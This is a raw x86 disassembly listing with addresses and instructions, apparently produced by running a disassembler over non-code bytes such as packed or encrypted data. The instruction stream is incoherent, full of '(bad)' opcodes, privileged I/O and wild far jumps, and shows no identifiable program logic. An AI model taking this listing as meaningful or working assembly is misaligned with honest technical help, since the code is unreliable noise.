  40f9aa:	in     al,dx
  40f9ab:	hlt    
  40f9ac:	dec    ebp
  40f9ad:	push   ecx
  40f9ae:	dec    ebx
  40f9af:	dec    esp
  40f9b0:	xor    ebp,ebp
  40f9b2:	cmp    ch,dh
  40f9b4:	call   0x66d4581d
  40f9b9:	xchg   ecx,eax
  40f9ba:	sbb    bl,BYTE PTR [edx+0xc]
  40f9bd:	xchg   esp,eax
  40f9be:	mov    bh,0x0
  40f9c0:	push   ebp
  40f9c1:	test   BYTE PTR [edx+edi*4-0x57],0xbe
  40f9c6:	dec    ecx
  40f9c7:	nop
  40f9c8:	icebp  
  40f9c9:	adc    cl,BYTE PTR [edx]
  40f9cb:	stos   DWORD PTR es:[edi],eax
  40f9cc:	inc    ebp
  40f9cd:	loop   0x40f985
  40f9cf:	sbb    dl,cl
  40f9d1:	int3   
  40f9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9d3:	jb     0x40fa3f
  40f9d5:	cmc    
  40f9d6:	popf   
  40f9d7:	nop
  40f9d8:	pushf  
  40f9d9:	push   ebp
  40f9da:	imul   edx,DWORD PTR [ebx-0x38],0x2d7e197c
  40f9e1:	mov    al,0x57
  40f9e3:	in     al,0x1d
  40f9e5:	or     cl,BYTE PTR [edx+0x70]
  40f9e8:	aas    
  40f9e9:	rcr    eax,0xdd
  40f9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9ed:	dec    edi
  40f9ee:	enter  0x411d,0xde
  40f9f2:	and    dh,al
  40f9f4:	(bad)  
  40f9f5:	lock js 0x40f9da
  40f9f8:	mov    ebx,DWORD PTR [ecx-0x6359fc89]
  40f9fe:	aad    0xd8
  40fa00:	mov    ch,0x2
  40fa02:	jmp    0xcb1dcc48
  40fa07:	cmp    eax,0x2a9c9378
  40fa0c:	mov    edi,ss
  40fa0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa0f:	arpl   WORD PTR [edx+eiz*4],si
  40fa12:	sbb    al,0xc3
  40fa14:	test   BYTE PTR [edx+eax*8+0x6afd0856],bl
  40fa1b:	inc    esp
  40fa1c:	adc    BYTE PTR [eax-0x1445b827],0x7b
  40fa23:	jno    0x40fa74
  40fa25:	or     eax,0x7946af82
  40fa2a:	in     eax,0xa5
  40fa2c:	fbstp  TBYTE PTR [esi+0x54e9c7a7]
  40fa32:	in     eax,0x36
  40fa34:	pop    es
  40fa35:	sbb    BYTE PTR [eax-0x1c],ch
  40fa38:	loopne 0x40fa34
  40fa3a:	jae    0x40fa73
  40fa3c:	aas    
  40fa3d:	sar    DWORD PTR [ecx-0x76],1
  40fa40:	call   0x5c6fa559
  40fa45:	sub    eax,0x75332544
  40fa4a:	into   
  40fa4b:	ret    
  40fa4c:	lahf   
  40fa4d:	jge    0x40fa61
  40fa4f:	xor    BYTE PTR [edx-0xe],bh
  40fa52:	sti    
  40fa53:	rcr    ebx,0xd4
  40fa56:	out    0x95,al
  40fa58:	pop    ds
  40fa59:	pop    ss
  40fa5a:	fiadd  DWORD PTR [edx]
  40fa5c:	pop    ds
  40fa5d:	cli    
  40fa5e:	jmp    0x451c:0x70e19f5e
  40fa65:	dec    ebp
  40fa66:	xchg   ebp,eax
  40fa67:	fstp   DWORD PTR [esi-0x2d]
  40fa6a:	lods   al,BYTE PTR ds:[esi]
  40fa6b:	mov    ecx,DWORD PTR [ebp-0x489d6582]
  40fa71:	rol    BYTE PTR [ecx-0x46],1
  40fa74:	sahf   
  40fa75:	mov    ecx,0xfb6894c7
  40fa7a:	and    cl,BYTE PTR [esi*4-0x5b1659a]
  40fa81:	jl     0x40fa48
  40fa83:	cmp    BYTE PTR [eax+eiz*4],0x4a
  40fa87:	or     DWORD PTR [ecx+ebp*4+0x3f],esi
  40fa8b:	imul   esi,ebp,0xd25f7298
  40fa91:	(bad)  
  40fa92:	mov    esi,0xf0851d7e
  40fa97:	int    0xf1
  40fa99:	pop    esp
  40fa9a:	or     cl,0x7e
  40fa9d:	(bad)  
  40fa9f:	lds    edi,FWORD PTR [ecx+0xfac8aaf]
  40faa5:	push   ebx
  40faa6:	test   DWORD PTR [ecx+0x63],ecx
  40faa9:	add    edx,esi
  40faab:	dec    edi
  40faac:	mov    ds:0xe52cb36e,eax
  40fab1:	std    
  40fab2:	lahf   
  40fab3:	into   
  40fab4:	sbb    ebp,DWORD PTR ds:0x16cac735
  40faba:	xor    ah,cl
  40fabc:	call   0x210f:0x3d3c4348
  40fac3:	fcom   QWORD PTR [ebx+0x2240562b]
  40fac9:	pmaxsw mm1,QWORD PTR [edx]
  40facc:	sbb    ecx,edi
  40face:	dec    ecx
  40facf:	pop    ds
  40fad0:	pop    es
  40fad1:	addr16 retf 
  40fad3:	nop
  40fad4:	jae    0x40fa8e
  40fad6:	addr16 aad 0xcf
  40fad9:	clc    
  40fada:	sbb    eax,0x61479efd
  40fadf:	(bad)  
  40fae0:	add    eax,0xf68971f7
  40fae5:	inc    eax
  40fae6:	sub    al,0xe0
  40fae8:	ds pop ds
  40faea:	push   es
  40faeb:	adc    dl,BYTE PTR [edi]
  40faed:	mov    cl,0xe1
  40faef:	jle    0x40fb47
  40faf1:	iret   
  40faf2:	dec    ebx
  40faf3:	mov    ebp,0x367c0a5
  40faf8:	loopne 0x40fb14
  40fafa:	rol    DWORD PTR [ebx+0x1a],0xf7
  40fafe:	popf   
  40faff:	mov    ecx,0xc0103ed
  40fb04:	jge    0x40fb83
  40fb06:	nop
  40fb07:	lods   al,BYTE PTR ds:[esi]
  40fb08:	clc    
  40fb09:	cmp    DWORD PTR [ebp+edx*8-0x6b4c1b68],0x14ed7829
  40fb14:	std    
  40fb15:	mov    ch,0x3
  40fb17:	sbb    al,0xe
  40fb19:	jecxz  0x40fb97
  40fb1b:	pop    esp
  40fb1c:	mov    ebx,ebp
  40fb1e:	or     BYTE PTR [ebx+0x53],0xb5
  40fb22:	and    DWORD PTR [eax],0x89c5d23b
  40fb28:	xor    bh,BYTE PTR [ecx-0x67b0834a]
  40fb2e:	fidivr DWORD PTR [ebp+esi*8+0x8]
  40fb32:	add    ch,ah
  40fb34:	ins    BYTE PTR es:[edi],dx
  40fb35:	shl    esi,cl
  40fb37:	xchg   BYTE PTR [ecx-0xb98391a],dh
  40fb3d:	xor    ebx,ebp
  40fb3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb40:	mov    ebp,0xb0469d17
  40fb45:	lods   al,BYTE PTR ds:[esi]
  40fb46:	push   ss
  40fb47:	(bad)  
  40fb48:	mov    ds:0xe86fa1b0,eax
  40fb4d:	lods   eax,DWORD PTR ds:[esi]
  40fb4e:	xchg   edx,eax
  40fb4f:	loopne 0x40fb05
  40fb51:	ret    0xce5d
  40fb54:	nop
  40fb55:	std    
  40fb56:	jb     0x40fb97
  40fb58:	jae    0x40fb7e
  40fb5a:	mov    esp,0xfca8490a
  40fb5f:	mov    edx,0x88eb8e7f
  40fb64:	xchg   ecx,eax
  40fb65:	inc    ebx
  40fb66:	dec    edx
  40fb67:	mov    edi,0xe808df8e
  40fb6c:	push   ebp
  40fb6d:	jmp    0xbdf5b4f9
  40fb72:	mov    dl,0xf3
  40fb74:	int3   
  40fb75:	mov    dh,BYTE PTR [ecx-0x29]
  40fb78:	(bad)  
  40fb79:	mov    ecx,0xf037eb77
  40fb7e:	cmc    
  40fb7f:	dec    ecx
  40fb80:	inc    esp
  40fb81:	xchg   edi,eax
  40fb82:	rcl    DWORD PTR [edx+0x714884c7],0xc2
  40fb89:	xor    DWORD PTR [esi],edx
  40fb8b:	jne    0x40fb47
  40fb8d:	xor    al,0xb3
  40fb8f:	jecxz  0x40fbe8
  40fb91:	xlat   BYTE PTR ds:[ebx]
  40fb92:	mov    cl,0xa7
  40fb94:	mov    BYTE PTR [esi],ah
  40fb96:	sub    DWORD PTR [ecx+eax*8],ecx
  40fb99:	stc    
  40fb9a:	loope  0x40fbe7
  40fb9c:	xor    eax,0xb71512d9
  40fba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fba2:	adc    bh,cl
  40fba4:	cmp    BYTE PTR [eax+0x67],0xb2
  40fba8:	push   es
  40fba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbaa:	imul   esi,esi,0x28
  40fbad:	sub    BYTE PTR [ebx],bh
  40fbaf:	mov    ch,0xc4
  40fbb1:	pop    edi
  40fbb2:	repnz mov edx,0xc8badd9c
  40fbb8:	xchg   ecx,eax
  40fbb9:	or     eax,0xf76beb71
  40fbbe:	aam    0x79
  40fbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbc1:	rcl    BYTE PTR [ebp-0x28bf27e3],cl
  40fbc7:	test   BYTE PTR [ecx-0x1f3982a7],al
  40fbcd:	adc    al,0x3f
  40fbcf:	mov    cl,0x4c
  40fbd1:	sbb    bh,bh
  40fbd3:	mov    al,ds:0x74a197a
  40fbd8:	cmc    
  40fbd9:	icebp  
  40fbda:	push   eax
  40fbdb:	jecxz  0x40fbf4
  40fbdd:	push   esi
  40fbde:	inc    esp
  40fbdf:	xor    eax,0xb9479886
  40fbe4:	push   cs
  40fbe5:	aas    
  40fbe6:	pushf  
  40fbe7:	popa   
  40fbe8:	jg     0x40fc27
  40fbea:	mov    esp,0xaf715ed4
  40fbef:	lds    edi,FWORD PTR [edx-0x76afc5bb]
  40fbf5:	jne    0x40fc75
  40fbf7:	(bad)  
  40fbf8:	popf   
  40fbf9:	leave  
  40fbfa:	add    DWORD PTR [edx+0x10],eax
  40fbfd:	push   ss
  40fbfe:	outs   dx,DWORD PTR ds:[esi]
  40fbff:	push   esp
  40fc00:	call   0xe88f554e
  40fc05:	xchg   edx,eax
  40fc06:	push   edx
  40fc07:	jns    0x40fb97
  40fc09:	xor    eax,0xbed3b5b0
  40fc0e:	mov    ebx,0x8fb8410b
  40fc13:	into   
  40fc14:	xchg   esi,eax
  40fc15:	ins    BYTE PTR es:[edi],dx
  40fc16:	(bad)  
  40fc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc18:	imul   edx,DWORD PTR [ebx+ebp*8+0x11047e3b],0x408852c0
  40fc23:	fdiv   st,st(2)
  40fc25:	pop    ecx
  40fc26:	push   esi
  40fc27:	push   ebx
  40fc28:	fst    QWORD PTR [eax-0x473abbc1]
  40fc2e:	push   edx
  40fc2f:	dec    eax
  40fc30:	adc    DWORD PTR [esi-0x44],edx
  40fc33:	sbb    bh,dh
  40fc35:	inc    edi
  40fc36:	das    
  40fc37:	fdiv   DWORD PTR [ecx-0x80]
  40fc3a:	cmp    eax,0x2c7d0fa2
  40fc3f:	jge    0x40fbd6
  40fc41:	cli    
  40fc42:	icebp  
  40fc43:	fsubr  DWORD PTR [ecx+0x6f0815d]
  40fc49:	adc    BYTE PTR [ebx],0xed
  40fc4c:	pop    es
  40fc4d:	mov    esp,0xb731cae6
  40fc52:	in     eax,0x51
  40fc54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc55:	dec    DWORD PTR [edx+0x40776b5]
  40fc5b:	pop    ecx
  40fc5c:	mov    ds:0x7fddc27,al
  40fc61:	out    dx,al
  40fc62:	xchg   esi,eax
  40fc63:	sbb    BYTE PTR [ebx+0x6f6ce43c],bl
  40fc69:	and    BYTE PTR [edx],bl
  40fc6b:	add    al,0x57
  40fc6d:	pop    esi
  40fc6e:	and    eax,0xc46c174e
  40fc73:	and    eax,0xadc018ba
  40fc78:	pop    edx
  40fc79:	int3   
  40fc7a:	fmul   QWORD PTR [esi]
  40fc7c:	xlat   BYTE PTR ds:[ebx]
  40fc7d:	xchg   edx,eax
  40fc7e:	jb     0x40fc2e
  40fc80:	stos   DWORD PTR es:[edi],eax
  40fc81:	cmp    DWORD PTR [edi],0xb56d42a1
  40fc87:	ficom  DWORD PTR [edx+0x4c2c7d3a]
  40fc8d:	mov    ah,0x91
  40fc8f:	jmp    0x2661:0x80102806
  40fc96:	pop    edi
  40fc97:	(bad)
  40fc9a:	jno    0x40fcf2
  40fc9c:	or     al,0x4c
  40fc9e:	gs sub eax,0xb8fe5da8
  40fca4:	pop    esi
  40fca5:	sbb    eax,0xf3e9691c
  40fcaa:	mov    edx,0xcbbaf864
  40fcaf:	mov    esp,0x4faa46b9
  40fcb4:	adc    ebp,0xffffffb1
  40fcb7:	jmp    0xe804:0x74e21581
  40fcbe:	std    
  40fcbf:	mov    ds:0xd4a4ecf2,al
  40fcc4:	les    eax,FWORD PTR [ebx]
  40fcc6:	xchg   edx,eax
  40fcc7:	rol    BYTE PTR [esi+0x2],1
  40fcca:	stc    
  40fccb:	inc    edx
  40fccc:	mov    ds:0x31607afa,al
  40fcd1:	jnp    0x40fd1e
  40fcd3:	inc    edx
  40fcd4:	mov    dl,0x69
  40fcd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcd7:	test   BYTE PTR [edi],0x9e
  40fcda:	std    
  40fcdb:	inc    ecx
  40fcdc:	and    bl,BYTE PTR [eax-0x74]
  40fcdf:	aaa    
  40fce0:	jmp    0xa47f577
  40fce5:	push   es
  40fce6:	pop    ss
  40fce7:	mul    DWORD PTR [edi+0x14c15aa5]
  40fced:	out    dx,al
  40fcee:	mov    al,ds:0xd236b1e5
  40fcf3:	pop    esp
  40fcf4:	add    al,0x79
  40fcf6:	ins    BYTE PTR es:[edi],dx
  40fcf7:	cs pop esp
  40fcf9:	adc    ah,BYTE PTR [edi+0x648a431f]
  40fcff:	lods   al,BYTE PTR es:[esi]
  40fd01:	popf   
  40fd02:	and    dl,0xc
  40fd05:	fcom   DWORD PTR [edx-0x4e]
  40fd08:	add    eax,DWORD PTR [ecx]
  40fd0a:	popf   
  40fd0b:	adc    ebx,DWORD PTR [edi+ebx*8-0x2da3b7b4]
  40fd12:	jl     0x40fd8c
  40fd14:	xor    dh,BYTE PTR [ebp-0x58]
  40fd17:	retf   
  40fd18:	shl    DWORD PTR [esp+eax*8+0x24],0xd9
  40fd1d:	mov    BYTE PTR [edi+0x7e046176],bh
  40fd23:	jo     0x40fd03
  40fd25:	pop    es
  40fd26:	sub    eax,0xfe880d7d
  40fd2b:	fld1   
  40fd2d:	fist   WORD PTR [edx]
  40fd2f:	ja     0x40fd93
  40fd31:	popf   
  40fd32:	lock jmp 0x344ae6ca
  40fd38:	push   ds
  40fd39:	(bad)  
  40fd3a:	cmp    eax,0xcdff32de
  40fd3f:	out    dx,al
  40fd40:	pusha  
  40fd41:	or     BYTE PTR [edi+eax*1+0x4271156a],0xcf
  40fd49:	adc    DWORD PTR [edi-0x701c415],ecx
  40fd4f:	bound  ebp,QWORD PTR [ecx-0x41]
  40fd52:	mov    ah,0xfd
  40fd54:	scas   eax,DWORD PTR es:[edi]
  40fd55:	std    
  40fd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd57:	sahf   
  40fd58:	arpl   WORD PTR [edx],ax
  40fd5a:	aad    0x8e
  40fd5c:	das    
  40fd5d:	test   DWORD PTR [ecx-0x6a8d9eae],ebp
  40fd63:	mov    eax,0xef9ff7e6
  40fd68:	dec    ebx
  40fd69:	mov    ah,0x49
  40fd6b:	hlt    
  40fd6c:	xor    ebx,DWORD PTR [edi]
  40fd6e:	cdq    
  40fd6f:	push   ecx
  40fd70:	pusha  
  40fd71:	push   eax
  40fd72:	js     0x40fd4a
  40fd74:	in     al,0x8a
  40fd76:	call   0xb0b010d9
  40fd7b:	push   es
  40fd7c:	into   
  40fd7d:	loopne 0x40fddf
  40fd7f:	ja     0x40fddc
  40fd81:	das    
  40fd82:	enter  0xef3b,0x41
  40fd86:	mov    al,ds:0xf2dbb83
  40fd8b:	fs xchg ebp,eax
  40fd8d:	shl    bh,1
  40fd8f:	outs   dx,BYTE PTR ds:[esi]
  40fd90:	and    ebp,DWORD PTR [esi-0x32214511]
  40fd96:	mov    ds:0x4750b6d7,al
  40fd9b:	xchg   bh,dh
  40fd9d:	jbe    0x40fd2d
  40fd9f:	cmc    
  40fda0:	stc    
  40fda1:	lods   al,BYTE PTR ss:[esi]
  40fda3:	pop    edx
  40fda4:	(bad)  
  40fda5:	pop    ss
  40fda6:	push   ds
  40fda7:	mov    BYTE PTR [ebx+ebx*2+0x7b],ch
  40fdab:	adc    BYTE PTR [eax+edi*4-0x67],dl
  40fdaf:	ins    DWORD PTR es:[edi],dx
  40fdb0:	and    BYTE PTR [esi-0x6a],0xec
  40fdb4:	or     al,0xc0
  40fdb6:	lock daa 
  40fdb8:	sub    BYTE PTR [ebx],0x39
  40fdbb:	mov    eax,0x94b4eb27
  40fdc0:	and    BYTE PTR [ebx+0x65],cl
  40fdc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdc4:	bound  eax,QWORD PTR [eax]
  40fdc6:	mov    ah,0xf1
  40fdc8:	inc    ebp
  40fdc9:	push   es
  40fdca:	aam    0x3b
  40fdcc:	lods   eax,DWORD PTR ds:[esi]
  40fdcd:	ret    0x4a42
  40fdd0:	je     0x40fdf3
  40fdd2:	adc    bl,BYTE PTR [ebx+ebp*1-0x3e6845f6]
  40fdd9:	test   eax,0xa192cfc5
  40fdde:	mov    ds:0x1b69adf,al
  40fde3:	test   eax,0xba8598a4
  40fde8:	inc    ebx
  40fde9:	ficom  WORD PTR [ebp-0x4c18f8c0]
  40fdef:	out    0xf6,al
  40fdf1:	mov    ah,0xcb
  40fdf3:	sar    BYTE PTR [eax],0x26
  40fdf6:	hlt    
  40fdf7:	jle    0x40fe0f
  40fdf9:	(bad)  
  40fdfd:	sub    esi,DWORD PTR [eax-0x5a3f4293]
  40fe03:	mov    al,0xea
  40fe05:	in     al,dx
  40fe06:	ja     0x40fe43
  40fe08:	lea    ebp,[edi+0x3754d941]
  40fe0e:	adc    DWORD PTR [esi+0x3a553536],0x1c2e553a
  40fe18:	clc    
  40fe19:	stos   BYTE PTR es:[edi],al
  40fe1a:	inc    edx
  40fe1b:	fstp   TBYTE PTR [edx]
  40fe1d:	dec    edx
  40fe1e:	cli    
  40fe1f:	push   edi
  40fe20:	push   eax
  40fe21:	adc    ecx,0x4e6c2574
  40fe27:	sti    
  40fe28:	sub    BYTE PTR [esi-0x75],al
  40fe2b:	dec    edx
  40fe2c:	mov    eax,0x91211957
  40fe31:	dec    edi
  40fe32:	ja     0x40fde3
  40fe34:	mov    bl,0xef
  40fe36:	xor    DWORD PTR [ebp+0x6b],esp
  40fe39:	jne    0x40fdc6
  40fe3b:	inc    esi
  40fe3c:	add    DWORD PTR [edx-0x5780aa53],ebx
  40fe42:	jo     0x40fdd8
  40fe44:	das    
  40fe45:	popa   
  40fe46:	cdq    
  40fe47:	jbe    0x40fea4
  40fe49:	test   BYTE PTR [ebx-0x78],0x5b
  40fe4d:	scas   al,BYTE PTR es:[edi]
  40fe4e:	sbb    al,0x86
  40fe50:	jecxz  0x40fe9f
  40fe52:	pop    esp
  40fe53:	stos   BYTE PTR es:[edi],al
  40fe54:	fisttp WORD PTR [esi]
  40fe56:	leave  
  40fe57:	and    al,0x65
  40fe59:	popf   
  40fe5a:	sbb    DWORD PTR [ebp-0x4c5e6b04],edx
  40fe60:	cmp    eax,0x5dabe7a5
  40fe65:	jle    0x40feba
  40fe67:	aad    0xc0
  40fe69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe6a:	jns    0x40fe11
  40fe6c:	or     ebp,DWORD PTR [ecx+0xc59144]
  40fe72:	pop    esp
  40fe73:	fs (bad) 
  40fe75:	test   eax,0x7bfc0a31
  40fe7a:	add    BYTE PTR cs:[eax+0x619c32ce],cl
  40fe81:	sbb    bl,BYTE PTR [ecx]
  40fe83:	fs in  al,0x73
  40fe86:	sbb    al,0x5c
  40fe88:	pop    esp
  40fe89:	pushw  es
  40fe8b:	push   0x6a30994c
  40fe90:	inc    ebx
  40fe91:	pop    eax
  40fe92:	xchg   ebp,eax
  40fe93:	or     al,0x33
  40fe95:	cmp    al,0xf2
  40fe97:	(bad)  [edi-0x2f]
  40fe9a:	(bad)  
  40fe9b:	in     eax,dx
  40fe9c:	push   esi
  40fe9d:	sbb    DWORD PTR [ecx+0x67],0x5a63a872
  40fea4:	sub    edi,DWORD PTR [ebx-0x80]
  40fea7:	into   
  40fea8:	fidiv  WORD PTR [esi+ebx*1-0x6d9bff2f]
  40feaf:	aas    
  40feb0:	shl    DWORD PTR [ecx+eiz*1+0x9fffabe],cl
  40feb7:	cmp    al,0x6c
  40feb9:	adc    dl,BYTE PTR [ebx]
  40febb:	or     DWORD PTR [ebp-0x47],eax
  40febe:	dec    ebx
  40febf:	jno    0x40fec5
  40fec1:	lods   al,BYTE PTR ds:[esi]
  40fec2:	adc    DWORD PTR [eax-0x4848d12c],ecx
  40fec8:	cmp    BYTE PTR [esi],ah
  40feca:	xchg   ebx,eax
  40fecb:	mov    bh,0xff
  40fecd:	push   cs
  40fece:	sub    eax,0x494d8b5d
  40fed3:	xchg   esp,eax
  40fed4:	push   eax
  40fed5:	cmp    eax,esi
  40fed7:	in     al,0x5b
  40fed9:	outs   dx,DWORD PTR ds:[esi]
  40feda:	retf   
  40fedb:	add    ch,0x80
  40fede:	xor    ah,BYTE PTR ds:0x450f5ca4
  40fee4:	fnstcw WORD PTR [edi+eiz*4-0x68255f1f]
  40feeb:	dec    eax
  40feec:	aaa    
  40feed:	xchg   ecx,eax
  40feee:	mov    ebp,0xe93d55b1
  40fef3:	push   0xfffffffa
  40fef5:	sbb    al,0xdf
  40fef7:	and    dl,BYTE PTR [edx]
  40fef9:	fisttp QWORD PTR [ecx+0x73]
  40fefc:	inc    bh
  40fefe:	pop    ebp
  40feff:	cdq    
  40ff00:	mov    bh,0xcd
  40ff02:	shl    DWORD PTR [ecx+0x40],1
  40ff05:	std    
  40ff06:	add    BYTE PTR ds:0xa1cfe624,ah
  40ff0c:	fist   DWORD PTR [ecx]
  40ff0e:	inc    ebp
  40ff0f:	push   0xffffffb1
  40ff11:	ins    BYTE PTR es:[edi],dx
  40ff12:	int3   
  40ff13:	jp     0x40fefd
  40ff15:	adc    BYTE PTR [ebx],ch
  40ff17:	add    ch,0x48
  40ff1a:	fs and esp,edi
  40ff1d:	push   esp
  40ff1e:	and    al,0xfd
  40ff20:	lods   eax,DWORD PTR ds:[esi]
  40ff21:	push   edx
  40ff22:	xor    ebp,DWORD PTR [ebp-0x485fe65]
  40ff28:	pop    gs
  40ff2a:	repnz fistp QWORD PTR [esi+0x672f98f6]
  40ff31:	mov    esp,0x745c4ad1
  40ff36:	xchg   esp,eax
  40ff37:	and    DWORD PTR [edi-0x74ce82ca],esi
  40ff3d:	push   ebx
  40ff3e:	add    DWORD PTR ds:0xfd301443,esi
  40ff44:	loop   0x40fee5
  40ff46:	xor    DWORD PTR [eax-0x7c9c8f29],0xffffffe7
  40ff4d:	test   dh,ah
  40ff4f:	je     0x40ff68
  40ff51:	retf   
  40ff52:	out    dx,al
  40ff53:	inc    esp
  40ff54:	sub    BYTE PTR [eax],bh
  40ff56:	mov    ds:0x50dfe636,eax
  40ff5b:	inc    esp
  40ff5c:	xchg   BYTE PTR [ebx+0x17],dl
  40ff5f:	push   ebx
  40ff60:	xchg   esp,eax
  40ff61:	sub    esp,DWORD PTR [ecx]
  40ff63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff64:	mov    eax,ds:0xe0bf42aa
  40ff69:	in     eax,0xae
  40ff6b:	clc    
  40ff6c:	jecxz  0x40ff5e
  40ff6e:	jecxz  0x40ff00
  40ff70:	sub    al,0x78
  40ff72:	cmp    bh,BYTE PTR ds:0xfd1ee5e0
  40ff78:	in     eax,0xf5
  40ff7a:	addr16 gs pusha 
  40ff7d:	dec    esi
  40ff7e:	add    ch,ch
  40ff80:	not    DWORD PTR ds:0x986f8cde
  40ff86:	cmp    ecx,DWORD PTR [ebx]
  40ff88:	xchg   esp,eax
  40ff89:	out    dx,eax
  40ff8a:	mov    ecx,0xbb5bffe9
  40ff8f:	sahf   
  40ff90:	pop    ss
  40ff91:	inc    BYTE PTR [ecx+ebp*8+0x34e814f7]
  40ff98:	add    DWORD PTR ds:0x1dc60115,eax
  40ff9e:	xchg   BYTE PTR [esi+0x25f7e3c9],bl
  40ffa4:	(bad)  
  40ffa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa6:	jns    0x40ff38
  40ffa8:	xor    edx,ebx
  40ffaa:	add    al,0xcc
  40ffac:	sub    al,0x41
  40ffae:	repz jae 0x40ffc2
  40ffb1:	add    ebx,eax
  40ffb3:	jmp    0xacc5bda1
  40ffb8:	mov    ebx,0xcb85b41a
  40ffbd:	repz xchg ebx,eax
  40ffbf:	aaa    
  40ffc0:	shr    DWORD PTR [esp+ebp*1],1
  40ffc3:	rcl    BYTE PTR [esi+0x4b36ca75],0xfe
  40ffca:	cmp    bl,dl
  40ffcc:	cmp    esp,esp
  40ffce:	dec    esp
  40ffcf:	rcr    esi,0x41
  40ffd2:	cli    
  40ffd3:	(bad)  
  40ffd4:	leave  
  40ffd5:	mov    eax,ds:0xdb69b5f5
  40ffda:	sbb    eax,0xbe85c9fc
  40ffdf:	inc    edx
  40ffe0:	inc    ebx
  40ffe1:	hlt    
  40ffe2:	sbb    DWORD PTR [ecx],0xb
  40ffe5:	rep stos BYTE PTR es:[edi],al
  40ffe7:	mov    ecx,cs
  40ffe9:	jmp    0x40ffa1
  40ffeb:	nop
  40ffec:	or     esp,esp
  40ffee:	mov    ecx,0xe23424b5
  40fff3:	jmp    0x410007
  40fff5:	ins    DWORD PTR es:[di],dx
  40fff7:	imul   esp,DWORD PTR ds:0xeac31094,0x35
  40fffe:	shl    BYTE PTR [ecx-0x19],1
  410001:	push   eax
  410002:	jecxz  0x40ffc6
  410004:	data16 add al,0x9d
  410007:	les    edi,FWORD PTR fs:[ebx+0x3d24f0f0]
  41000e:	ror    DWORD PTR [ecx+ecx*2-0xb9982e7],1
  410015:	mov    BYTE PTR [esi],dh
  410017:	dec    eax
  410018:	push   ds
  410019:	shl    DWORD PTR [eax+0x6f57a427],0xc1
  410020:	fistp  WORD PTR [esp+eax*8+0x78b7d143]
  410027:	mov    al,ds:0x20f946a2
  41002c:	xchg   BYTE PTR [esi-0x1a24bd9c],dh
  410032:	xchg   ecx,eax
  410033:	loopne 0x41008e
  410035:	shr    DWORD PTR [edx+0x46a17805],cl
  41003b:	fisttp DWORD PTR [ebx]
  41003d:	fidiv  DWORD PTR [eax+0x78]
  410040:	out    dx,al
  410041:	movnti DWORD PTR [esi-0x3bb7ded3],esp
  410048:	pop    edi
  410049:	cmp    ecx,esi
  41004b:	retf   0xe1dd
  41004e:	push   esp
  41004f:	xchg   ebx,eax
  410050:	fs push es
  410052:	outs   dx,DWORD PTR ds:[esi]
  410053:	ss aas 
  410055:	mov    bh,0x47
  410057:	jecxz  0x41005f
  410059:	mov    ds:0xb85112b8,eax
  41005e:	cld    
  41005f:	cmp    DWORD PTR [ecx+0x20],0x42640b8e
  410066:	mov    edx,0x6f2e11d5
  41006b:	add    DWORD PTR [eax],ebx
  41006d:	call   0x28d7:0x977d3697
  410074:	scas   eax,DWORD PTR es:[edi]
  410075:	sbb    BYTE PTR [ecx+eax*1],bl
  410078:	es jmp 0x4100e0
  41007b:	scas   al,BYTE PTR es:[edi]
  41007c:	retf   0x514f
  41007f:	fld    DWORD PTR [edi]
  410081:	lods   eax,DWORD PTR ds:[esi]
  410082:	or     al,BYTE PTR [edx+ebx*4]
  410085:	test   BYTE PTR ds:0xfaf89918,bh
  41008b:	push   edi
  41008c:	and    DWORD PTR [edx+esi*2+0x4281b164],esi
  410093:	jle    0x41002e
  410095:	jp     0x410069
  410097:	mov    esp,esi
  410099:	je     0x410102
  41009b:	and    BYTE PTR [edx+0x76f8c0db],dl
  4100a1:	clc    
  4100a2:	pushf  
  4100a3:	adc    al,0x4
  4100a5:	or     ecx,DWORD PTR [ebx-0x33251ad3]
  4100ab:	mov    esp,0xc6acb34f
  4100b0:	jno    0x410042
  4100b2:	fdivr  QWORD PTR [ebx-0x534d91af]
  4100b8:	push   edx
  4100b9:	push   ss
  4100ba:	outs   dx,DWORD PTR ds:[esi]
  4100bb:	jns    0x410046
  4100bd:	push   ss
  4100be:	in     eax,dx
  4100bf:	sahf   
  4100c0:	xor    eax,DWORD PTR [ecx+0x1]
  4100c3:	sti    
  4100c4:	les    eax,FWORD PTR ds:0x5669514
  4100ca:	fstp   TBYTE PTR [eax+0x33]
  4100cd:	mov    al,BYTE PTR [ecx+0x7d]
  4100d0:	pop    esp
  4100d1:	dec    ecx
  4100d2:	xchg   esi,eax
  4100d3:	mov    edi,0x1044e155
  4100d8:	and    ebp,DWORD PTR [esi+0x28]
  4100db:	push   edx
  4100dc:	ror    BYTE PTR [esi],0x94
  4100df:	das    
  4100e0:	jmp    FWORD PTR [edi]
  4100e2:	lahf   
  4100e3:	add    dh,0x51
  4100e6:	pop    es
  4100e7:	push   ds
  4100e8:	jmp    0x422cdb22
  4100ed:	adc    BYTE PTR ss:[eax],bl
  4100f0:	or     BYTE PTR [esi+0x6a],bl
  4100f3:	sahf   
  4100f4:	or     eax,0x3206e3eb
  4100f9:	or     DWORD PTR [ebx+esi*2+0xbef42],eax
  410100:	mov    dl,0xe6
  410102:	sti    
  410103:	in     al,0xad
  410105:	or     al,0xf6
  410107:	data16 data16 mov ch,0xff
  41010b:	sbb    BYTE PTR [edx],al
  41010d:	rcl    ebx,1
  41010f:	mov    ecx,DWORD PTR [eax-0x11]
  410112:	daa    
  410113:	cdq    
  410114:	push   ebp
  410115:	retf   0x7d36
  410118:	inc    esi
  410119:	sbb    cl,BYTE PTR ds:0xf61cf4d2
